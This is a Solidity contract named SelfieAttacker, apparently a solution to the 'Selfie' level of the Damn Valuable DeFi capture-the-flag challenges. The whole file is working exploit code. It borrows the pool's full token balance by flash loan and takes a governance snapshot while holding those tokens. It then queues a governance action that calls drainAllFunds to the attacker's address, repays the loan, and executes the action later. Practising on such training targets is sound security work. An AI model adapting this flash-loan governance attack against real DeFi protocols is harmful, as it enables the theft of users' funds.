// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttacker {
    SimpleGovernance private simpleGovernance;
    SelfiePool private selfiePool;
    DamnValuableTokenSnapshot private dvtSnapshot;
    address private attacker;
    uint256 actionId;

    function attackStep1(address _selfiePool, address _simpleGovernance, address _dvtSnapshot) external {
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        selfiePool = SelfiePool(_selfiePool);
        dvtSnapshot = DamnValuableTokenSnapshot(_dvtSnapshot);
        attacker = msg.sender;
        selfiePool.flashLoan(dvtSnapshot.balanceOf(_selfiePool));
    }

    function attackStep2() external {
        simpleGovernance.executeAction(actionId);
    }

    function receiveTokens(address token, uint256 amount) external {
        dvtSnapshot.snapshot();
        actionId = simpleGovernance.queueAction(
            address(selfiePool),
            abi.encodeWithSelector(selfiePool.drainAllFunds.selector, attacker),
            0
        );
        dvtSnapshot.transfer(address(selfiePool), amount);
    }
}